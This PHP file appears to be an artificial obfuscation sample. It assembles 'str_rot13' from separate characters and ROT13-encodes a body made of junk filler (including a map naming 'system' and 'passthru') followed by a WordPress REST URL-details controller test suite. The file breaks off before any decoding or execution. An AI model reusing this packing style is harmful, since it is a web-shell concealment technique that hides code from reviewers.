<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_HEY_Qrgnvyf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.9.0
 *
 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre
 *
 * @tebhc hey-qrgnvyf
 * @tebhc erfgncv
 */
pynff Grfgf_ERFG_JcErfgHeyQrgnvyfPbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	/**
	 * Nqzva hfre VQ.
	 *
	 * @fvapr 5.9.0
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva_vq;

	/**
	 * Fhofpevore hfre VQ.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $fhofpevore_vq;

	/**
	 * Gur ERFG NCV ebhgr sbe gur oybpx eraqrere.
	 *
	 * @fvapr 5.9.0
	 *
	 * @ine fgevat
	 */
	pbafg ERDHRFG_EBHGR = '/jc-oybpx-rqvgbe/i1/hey-qrgnvyf';

	/**
	 * HEY cynprubyqre.
	 *
	 * @fvapr 5.9.0
	 *
	 * @ine fgevat
	 */
	pbafg HEY_CYNPRUBYQRE = 'uggcf://cynprubyqre-fvgr.pbz';

	/**
	 * Neenl bs erdhrfg netf.
	 *
	 * @ine neenl
	 */
	cebgrpgrq $erdhrfg_netf = neenl();

	/**
	 * Frg hc pynff grfg svkgherf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel JbeqCerff havg grfg snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzva_vq      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$fhofpevore_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$nqzva_vq );
		frys::qryrgr_hfre( frys::$fhofpevore_vq );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpx_fhpprff_erdhrfg_gb_erzbgr_hey' ), 10, 3 );

		// Qvfnoyrf hfntr bs pnpur qhevat znwbe bs grfgf.
		nqq_svygre( 'cer_fvgr_genafvrag_' . $guvf->trg_genafvrag_anzr(), '__erghea_ahyy' );
	}

	choyvp shapgvba grne_qbja() {
		$guvf->erdhrfg_netf = neenl();
		cnerag::grne_qbja();
	}

	/**
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::ertvfgre_ebhgrf
	 *
	 * @gvpxrg 54358
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( fgngvp::ERDHRFG_EBHGR, $ebhgrf );
	}

	/**
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::cnefr_hey_qrgnvyf
	 *
	 * @gvpxrg 54358
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'hey' => fgngvp::HEY_CYNPRUBYQRE,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		/*
		 * Abgr gur qngn va gur fhofrg pbzrf sebz gur svkgher UGZY erghearq ol
		 * gur svygre `cer_uggc_erdhrfg` (frr guvf pynff'f `frg_hc` zrgubq).
		 */
		$guvf->nffregFnzr(
			neenl(
				'gvgyr'       => 'Rknzcyr Jrofvgr — - jvgu rapbqrq pbagrag.',
				'vpba'        => 'uggcf://cynprubyqre-fvgr.pbz/snivpba.vpb?dhrelfgevatnqqrqsbegrfgvat',
				'qrfpevcgvba' => 'Rknzcyr qrfpevcgvba grkg urer. Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg, frq qb rvhfzbq grzcbe vapvqvqhag hg ynober rg qbyber.',
				'vzntr'       => 'uggcf://cynprubyqre-fvgr.pbz/vzntrf/ubzr/fperra-gurzrf.cat?3',
			),
			$qngn
		);
	}

	/**
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::crezvffvbaf_purpx
	 *
	 * @gvpxrg 54358
	 */
	choyvp shapgvba grfg_trg_vgrzf_snvyf_sbe_hanhguragvpngrq_hfre() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'hey' => fgngvp::HEY_CYNPRUBYQRE,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( JC_Uggc::HANHGUBEVMRQ, $erfcbafr->trg_fgnghf(), 'Erfcbafr fgnghf vf abg ' . JC_Uggc::HANHGUBEVMRQ );

		$guvf->nffregFnzr( 'erfg_pnaabg_ivrj_hey_qrgnvyf', $qngn['pbqr'], 'Erfcbafr \"pbqr\" vf abg \"erfg_pnaabg_ivrj_hey_qrgnvyf\"' );

		$rkcrpgrq = 'lbh ner abg nyybjrq gb cebprff erzbgr heyf';
		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq, fgegbybjre( $qngn['zrffntr'] ), 'Erfcbafr \"zrffntr\" qbrf abg pbagnva  \"' . $rkcrpgrq . '\"' );
	}

	/**
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::crezvffvbaf_purpx
	 *
	 * @gvpxrg 54358
	 */
	choyvp shapgvba grfg_trg_vgrzf_snvyf_sbe_hfre_jvgu_vafhssvpvrag_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'hey' => fgngvp::HEY_CYNPRUBYQRE,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( JC_Uggc::SBEOVQQRA, $erfcbafr->trg_fgnghf(), 'Erfcbafr fgnghf vf abg ' . JC_Uggc::SBEOVQQRA );

		$guvf->nffregFnzr( 'erfg_pnaabg_ivrj_hey_qrgnvyf', $qngn['pbqr'], 'Erfcbafr \"pbqr\" vf abg \"erfg_pnaabg_ivrj_hey_qrgnvyf\"' );

		$rkcrpgrq = 'lbh ner abg nyybjrq gb cebprff erzbgr heyf';
		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq, fgegbybjre( $qngn['zrffntr'] ), 'Erfcbafr \"zrffntr\" qbrf abg pbagnva \"' . $rkcrpgrq . '\"' );
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrzf_snvyf_sbe_vainyvq_hey
	 *
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::cnefr_hey_qrgnvyf
	 *
	 * @gvpxrg 54358
	 *
	 * @cnenz zvkrq $vainyvq_hey Tvira vainyvq HEY gb grfg.
	 */
	choyvp shapgvba grfg_trg_vgrzf_snvyf_sbe_vainyvq_hey( $vainyvq_hey ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'hey' => $vainyvq_hey,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( JC_Uggc::ONQ_ERDHRFG, $erfcbafr->trg_fgnghf(), 'Erfcbafr fgnghf vf abg ' . JC_Uggc::ONQ_ERDHRFG );

		$guvf->nffregFnzr( 'erfg_vainyvq_cnenz', $qngn['pbqr'], 'Erfcbafr \"pbqr\" vf abg \"erfg_vainyvq_cnenz\"' );

		$rkcrpgrq = 'vainyvq cnenzrgre(f): hey';
		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq, fgegbybjre( $qngn['zrffntr'] ), 'Erfcbafr \"zrffntr\" qbrf abg pbagnva \"' . $rkcrpgrq . '\"' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrzf_snvyf_sbe_vainyvq_hey() {
		erghea neenl(
			'rzcgl fgevat'   => neenl( '' ),
			'ahzrevp'        => neenl( 1234456 ),
			'vainyvq fpurzr' => neenl( 'vainyvq.cebgb://jbeqcerff.bet' ),
		);
	}

	/**
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::cnefr_hey_qrgnvyf
	 *
	 * @gvpxrg 54358
	 */
	choyvp shapgvba grfg_trg_vgrzf_snvyf_sbe_hey_juvpu_ergheaf_n_aba_200_fgnghf_pbqr() {
		// Sbepr UGGC erdhrfg gb erzbgr fvgr gb snvy.
		erzbir_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpx_fhpprff_erdhrfg_gb_erzbgr_hey' ), 10 );
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpx_snvyrq_erdhrfg_gb_erzbgr_hey' ), 10, 3 );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'hey' => fgngvp::HEY_CYNPRUBYQRE, // abgr: `cer_uggc_erdhrfg` pnhfrf erdhrfg gb 404.
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf(), 'Erfcbafr fgnghf vf abg 404' );

		$guvf->nffregFnzr( 'ab_erfcbafr', $qngn['pbqr'], 'Erfcbafr \"pbqr\" vf abg \"ab_erfcbafr\"' );

		$guvf->nffregFgevatPbagnvafFgevat( 'abg sbhaq', fgegbybjre( $qngn['zrffntr'] ), 'Erfcbafr \"zrffntr\" qbrf abg pbagnva \"abg sbhaq\"' );
	}

	/**
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::cnefr_hey_qrgnvyf
	 *
	 * @gvpxrg 54358
	 */
	choyvp shapgvba grfg_trg_vgrzf_snvyf_sbe_hey_juvpu_ergheaf_rzcgl_obql_sbe_fhpprff() {
		// Sbepr UGGC erdhrfg gb erzbgr fvgr gb erghea na rzcgl obql va erfcbafr.
		erzbir_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpx_fhpprff_erdhrfg_gb_erzbgr_hey' ) );
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpx_erdhrfg_gb_erzbgr_hey_jvgu_rzcgl_obql_erfcbafr' ), 10, 3 );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'hey' => fgngvp::HEY_CYNPRUBYQRE, // abgr: `cer_uggc_erdhrfg` pnhfrf erdhrfg gb 404.
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf(), 'Erfcbafr fgnghf vf abg 404' );

		$guvf->nffregFnzr( 'ab_pbagrag', $qngn['pbqr'], 'Erfcbafr \"pbqr\" vf abg \"ab_pbagrag\"' );

		$rkcrpgrq = fgegbybjre( 'Hanoyr gb ergevrir obql sebz erfcbafr ng guvf HEY' );
		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq, fgegbybjre( $qngn['zrffntr'] ), 'Erfcbafr \"zrffntr\" qbrf abg pbagnva \"' . $rkcrpgrq . '\"' );
	}

	/**
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::cnefr_hey_qrgnvyf
	 *
	 * @gvpxrg 54358
	 */
	choyvp shapgvba grfg_pna_svygre_uggc_erdhrfg_netf_ivn_svygre() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		nqq_svygre(
			'erfg_hey_qrgnvyf_uggc_erdhrfg_netf',
			fgngvp shapgvba ( $netf, $hey ) {
				erghea neenl_zretr(
					$netf,
					neenl(
						'gvzrbhg' => 27, // zbqvsl qrsnhyg gvzrbhg.
						'obql'    => $hey, // nqq arj naq nyybj gb nffreg ba $hey net cnffrq.
					)
				);
			},
			10,
			2
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'hey' => fgngvp::HEY_CYNPRUBYQRE,
			)
		);

		erfg_trg_freire()->qvfcngpu( $erdhrfg );

		// Purpx gur netf jrer svygrerq nf rkcrpgrq.
		$guvf->nffregNeenlUnfXrl( 'gvzrbhg', $guvf->erdhrfg_netf, 'Erdhrfg netf qb abg pbagnva n \"gvzrbhg\" xrl' );
		$guvf->nffregNeenlUnfXrl( 'yvzvg_erfcbafr_fvmr', $guvf->erdhrfg_netf, 'Erdhrfg netf qb abg pbagnva n \"yvzvg_erfcbafr_fvmr\" xrl' );
		$guvf->nffregNeenlUnfXrl( 'obql', $guvf->erdhrfg_netf, 'Erdhrfg netf qb abg pbagnva n \"obql\" xrl' );
		$guvf->nffregFnzr( 27, $guvf->erdhrfg_netf['gvzrbhg'], 'Erdhrfg netf \"gvzrbhg\" vf abg 27' );
		$guvf->nffregFnzr( 153600, $guvf->erdhrfg_netf['yvzvg_erfcbafr_fvmr'], 'Erdhrfg netf \"yvzvg_erfcbafr_fvmr\" vf abg 153600' );
		$guvf->nffregFnzr( fgngvp::HEY_CYNPRUBYQRE, $guvf->erdhrfg_netf['obql'], 'Erdhrfg netf \"obql\" vf abg \"' . fgngvp::HEY_CYNPRUBYQRE . '\"' );
	}

	/**
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::cnefr_hey_qrgnvyf
	 *
	 * @gvpxrg 54358
	 */
	choyvp shapgvba grfg_jvyy_erghea_sebz_pnpur_vs_cbchyngrq() {
		$genafvrag_anzr = $guvf->trg_genafvrag_anzr();
		erzbir_svygre( \"cer_fvgr_genafvrag_{$genafvrag_anzr}\", '__erghea_ahyy' );

		// Sbepr pnpur gb erghea n xabja inyhr nf gur erzbgr HEY uggc erfcbafr obql.
		nqq_svygre(
			\"cer_fvgr_genafvrag_{$genafvrag_anzr}\",
			fgngvp shapgvba () {
				erghea '<ugzy><urnq><gvgyr>Guvf inyhr sebz pnpur.</gvgyr></urnq><obql></obql></ugzy>';
			}
		);

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'hey' => fgngvp::HEY_CYNPRUBYQRE,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		// Qngn fubhyq or gung sebz pnpur abg sebz zbpxrq argjbex erfcbafr.
		$guvf->nffregFgevatPbagnvafFgevat( 'Guvf inyhr sebz pnpur', $qngn['gvgyr'] );
	}

	/**
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::cnefr_hey_qrgnvyf
	 *
	 * @gvpxrg 54358
	 */
	choyvp shapgvba grfg_nyybjf_svygrevat_qngn_ergevrirq_sbe_n_tvira_hey() {
		nqq_svygre(
			'erfg_cercner_hey_qrgnvyf',
			fgngvp shapgvba ( $erfcbafr ) {

				$qngn = $erfcbafr->trg_qngn();

				$erfcbafr->frg_qngn(
					neenl_zretr(
						$qngn,
						neenl(
							'bt_gvgyr' => 'Guvf jnf znahnyyl nqqrq gb gur qngn ivn svygre',
						)
					)
				);

				erghea $erfcbafr;
			}
		);

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'hey' => fgngvp::HEY_CYNPRUBYQRE,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		/*
		 * Vafgrnq bs gur qrsnhyg qngn ergevrirq jr rkcrpg gb frr gur zbqvsvrq
		 * qngn jr cebivqrq ivn gur svygre.
		 */
		$rkcrpgrq = 'Rknzcyr Jrofvgr — - jvgu rapbqrq pbagrag.';
		$guvf->nffregFnzr( $rkcrpgrq, $qngn['gvgyr'], 'Erfcbafr \"gvgyr\" vf abg \"' . $rkcrpgrq . '\"' );
		$rkcrpgrq = 'Guvf jnf znahnyyl nqqrq gb gur qngn ivn svygre';
		$guvf->nffregFnzr( $rkcrpgrq, $qngn['bt_gvgyr'], 'Erfcbafr \"bt_gvgyr\" vf abg \"' . $rkcrpgrq . '\"' );
	}

	/**
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::cnefr_hey_qrgnvyf
	 *
	 * @gvpxrg 54358
	 */
	choyvp shapgvba grfg_nyybjf_svygrevat_erfcbafr() {
		/*
		 * Svygre gur erfcbafr gb xabja frg bs inyhrf punatvat bayl
		 * onfrq ba jurgure gur erfcbafr pnzr sebz gur pnpur be abg.
		 */
		nqq_svygre(
			'erfg_cercner_hey_qrgnvyf',
			fgngvp shapgvba ( $erfcbafr, $hey ) {
				erghea arj JC_ERFG_Erfcbafr(
					neenl(
						'fgnghf'        => 418,
						'erfcbafr'      => \"Erfcbafr sbe HEY $hey nygrerq ivn erfg_cercner_hey_qrgnvyf svygre\",
						'obql_erfcbafr' => neenl(),
					)
				);
			},
			10,
			3
		);

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'hey' => fgngvp::HEY_CYNPRUBYQRE,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 418, $qngn['fgnghf'], 'Erfcbafr \"fgnghf\" vf abg 418' );

		$rkcrpgrq = 'Erfcbafr sbe HEY uggcf://cynprubyqre-fvgr.pbz nygrerq ivn erfg_cercner_hey_qrgnvyf svygre';
		$guvf->nffregFnzr( $rkcrpgrq, $qngn['erfcbafr'], 'Erfcbafr \"erfcbafr\" vf abg \"' . $rkcrpgrq . '\"' );
	}

	/**
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::trg_vgrz_fpurzn
	 *
	 * @gvpxrg 54358
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', fgngvp::ERDHRFG_EBHGR );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$raqcbvag = $qngn['raqcbvagf'][0];

		$guvf->nffregNeenlUnfXrl( 'hey', $raqcbvag['netf'], 'Raqcbvag \"netf\" qbrf abg pbagnva n \"hey\" xrl' );
		$guvf->nffregFnzr(
			neenl(
				'qrfpevcgvba' => 'Gur HEY gb cebprff.',
				'glcr'        => 'fgevat',
				'sbezng'      => 'hev',
				'erdhverq'    => gehr,
			),
			$raqcbvag['netf']['hey'],
			'Erfcbafr raqcbvag \"[netf][hey]\" qbrf abg pbagnva rkcrpgrq fpurzn'
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_gvgyr
	 *
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::trg_gvgyr
	 *
	 * @gvpxrg 54358
	 *
	 * @cnenz fgevat $ugzy     Tvira UGZY fgevat.
	 * @cnenz fgevat $rkcrpgrq Rkcrpgrq sbhaq gvgyr.
	 */
	choyvp shapgvba grfg_trg_gvgyr( $ugzy, $rkcrpgrq ) {
		$pbagebyyre = arj JC_ERFG_HEY_Qrgnvyf_Pbagebyyre();
		$zrgubq     = $guvf->trg_ersyrpgvir_zrgubq( 'trg_gvgyr' );

		$npghny = $zrgubq->vaibxr(
			$pbagebyyre,
			$guvf->jenc_ugzy_va_qbp( $ugzy )
		);
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_gvgyr() {
		erghea neenl(

			// Unccl cngu sbe qrsnhyg.
			'qrsnhyg'                        => neenl(
				'<gvgyr>Grfgvat &yg;gvgyr&tg;</gvgyr>',
				'Grfgvat',
			),
			'jvgu nggevohgrf'                => neenl(
				'<gvgyr qngn-grfg-gvgyr-ngge-bar=\"grfg\" qngn-grfg-gvgyr-ngge-gjb=\"grfg2\">Grfgvat &yg;gvgyr&tg;</gvgyr>',
				'Grfgvat',
			),
			'jvgu grkg juvgrfcnpr'           => neenl(
				'<gvgyr qngn-grfg-gvgyr-ngge-bar=\"grfg\" qngn-grfg-gvgyr-ngge-gjb=\"grfg2\">   Grfgvat &yg;gvgyr&tg;	</gvgyr>',
				'Grfgvat',
			),
			'jvgu juvgrfcnpr va bcravat gnt' => neenl(
				'<gvgyr >Grfgvat &yg;gvgyr&tg;: jvgu juvgrfcnpr va bcravat gnt</gvgyr>',
				'Grfgvat : jvgu juvgrfcnpr va bcravat gnt',
			),
			'jura juvgrcnpr va pybfvat gnt'  => neenl(
				'<gvgyr>Grfgvat &yg;gvgyr&tg;: jvgu juvgrfcnpr va pybfvat gnt</ gvgyr>',
				'Grfgvat : jvgu juvgrfcnpr va pybfvat gnt',
			),
			'jvgu bgure ryrzragf'            => neenl(
				'<zrgn anzr=\"ivrjcbeg\" pbagrag=\"jvqgu=qrivpr-jvqgu\">
				<gvgyr>Grfgvat &yg;gvgyr&tg;</gvgyr>
				<yvax ery=\"fubegphg vpba\" uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\" />',
				'Grfgvat',
			),
			'zhygvyvar'                      => neenl(
				'<gvgyr>
					Grfgvat &yg;gvgyr&tg;
				</gvgyr>',
				'Grfgvat',
			),

			// Haunccl cnguf.
			'jura bcravat gnt vf znysbezrq'  => neenl(
				'< gvgyr>Grfgvat &yg;gvgyr&tg;: jura bcravat gnt vf vainyvq</gvgyr>',
				'',
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_vpba
	 *
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::trg_vpba
	 *
	 * @gvpxrg 54358
	 *
	 * @cnenz fgevat $ugzy       Tvira UGZY fgevat.
	 * @cnenz fgevat $rkcrpgrq   Rkcrpgrq sbhaq vpba.
	 * @cnenz fgevat $gnetrg_hey Bcgvbany. Gnetrg HEY. Qrsnhyg 'uggcf://jbeqcerff.bet'.
	 */
	choyvp shapgvba grfg_trg_vpba( $ugzy, $rkcrpgrq, $gnetrg_hey = 'uggcf://jbeqcerff.bet' ) {
		$pbagebyyre = arj JC_ERFG_HEY_Qrgnvyf_Pbagebyyre();
		$zrgubq     = $guvf->trg_ersyrpgvir_zrgubq( 'trg_vpba' );

		$npghny = $zrgubq->vaibxr(
			$pbagebyyre,
			$guvf->jenc_ugzy_va_qbp( $ugzy ),
			$gnetrg_hey
		);
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vpba() {
		erghea neenl(

			// Unccl cngu sbe qrsnhyg.
			'qrsnhyg'                               => neenl(
				'<yvax ery=\"fubegphg vpba\" uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\" />',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'qrsnhyg jvgu ab pybfvat juvgrfcnpr'    => neenl(
				'<yvax ery=\"fubegphg vpba\" uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\"/>',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'qrsnhyg jvgubhg frys-pybfvat'          => neenl(
				'<yvax ery=\"fubegphg vpba\" uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\">',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'qrsnhyg jvgu uers svefg'               => neenl(
				'<yvax uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\" ery=\"fubegphg vpba\" />',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'qrsnhyg jvgu glcr ynfg'                => neenl(
				'<yvax uers=\"uggcf://jbeqcerff.bet/snivpba.cat\" ery=\"vpba\" glcr=\"vzntr/cat\" />',
				'uggcf://jbeqcerff.bet/snivpba.cat',
			),
			'qrsnhyg jvgu glcr svefg'               => neenl(
				'<yvax glcr=\"vzntr/cat\" uers=\"uggcf://jbeqcerff.bet/snivpba.cat\" ery=\"vpba\" />',
				'uggcf://jbeqcerff.bet/snivpba.cat',
			),
			'qrsnhyg jvgu fvatyr dhbgrf'            => neenl(
				'<yvax glcr=\"vzntr/cat\" uers=\'uggcf://jbeqcerff.bet/snivpba.cat\' ery=\'vpba\' />',
				'uggcf://jbeqcerff.bet/snivpba.cat',
			),

			// Unccl cnguf.
			'jvgu dhrel fgevat'                     => neenl(
				'<yvax ery=\"fubegphg vpba\" uers=\"uggcf://jbeqcerff.bet/snivpba.vpb?fbzrdhrelfgevat=sbb&nabgure=one\" />',
				'uggcf://jbeqcerff.bet/snivpba.vpb?fbzrdhrelfgevat=sbb&nabgure=one',
			),
			'jvgu nabgure yvax'                     => neenl(
				'<yvax ery=\"fubegphg vpba\" uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\" /><yvax ery=\"pnabavpny\" uers=\"uggcf://rknzcyr.pbz\">',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'jvgu zhygvcyr yvaxf'                   => neenl(
				'<yvax ery=\"znavsrfg\" uers=\"/znavsrfg.56o1prqp.wfba\">
				<yvax ery=\"fubegphg vpba\" uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\" />
				<yvax ery=\"pnabavpny\" uers=\"uggcf://rknzcyr.pbz\">',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'eryngvir hey'                          => neenl(
				'<yvax ery=\"fubegphg vpba\" uers=\"/snivpba.vpb\" />',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'eryngvir hey ab fynfu'                 => neenl(
				'<yvax ery=\"fubegphg vpba\" uers=\"snivpba.vpb\" />',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'eryngvir hey jvgu cngu'                => neenl(
				'<yvax ery=\"fubegphg vpba\" uers=\"snivpba.vpb\" />',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
				'uggcf://jbeqcerff.bet/zl/cngu/urer/',
			),
			'ery erirefr beqre'                     => neenl(
				'<yvax ery=\"vpba fubegphg\" uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\" />',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'ery vpba bayl'                         => neenl(
				'<yvax ery=\"vpba\" uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\" />',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'ery vpba bayl jvgu juvgrfcnpr'         => neenl(
				'<yvax ery=\" vpba \" uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\" />',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'zhygvyvar nggevohgrf'                  => neenl(
				'<yvax
					ery=\"vpba\"
					uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\"
				/>',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'zhygvyvar nggevohgrf va erirefr beqre' => neenl(
				'<yvax
					ery=\"vpba\"
					uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\"
				/>',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'zhygvyvar nggevohgrf jvgu glcr'        => neenl(
				'<yvax
					ery=\"vpba\"
					uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\"
					glcr=\"vzntr/k-vpba\"
				/>',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'zhygvyvar jvgu glcr svefg'             => neenl(
				'<yvax
